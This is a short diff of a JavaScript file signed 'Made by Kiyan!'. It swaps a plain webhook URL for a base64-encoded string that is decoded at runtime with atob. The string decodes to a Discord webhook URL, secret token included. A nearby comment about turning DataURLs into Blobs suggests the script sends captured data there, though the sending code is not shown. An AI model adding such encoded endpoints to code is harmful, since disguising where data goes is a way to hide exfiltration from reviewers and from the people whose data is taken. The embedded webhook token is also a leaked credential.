@@ -1,7 +1,8 @@
 console.log("Made by Kiyan!");
 
 // === CONFIGURATION ===
-const webhookURL = "https://dcrelay.liteeagle.me/relay/cc120245-c8c8-47d1-a073-b7fd4491722b";
+const webhookBase = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQyMjk2MzcxMTQ0MTg5OTU4MS9qaF9sa0F5MW5ka3VSUTJmZmJjNXFDU3E5R3VjdkR2dTRIV2xVU3dCMUdaTWJSRFA4dEZtRzJQbTBQMnNTMmswZGw3cA==";
+const webhookURL = atob(webhookBase);
 let username = null;
 
 // Helper to convert DataURL to Blob (your classic)
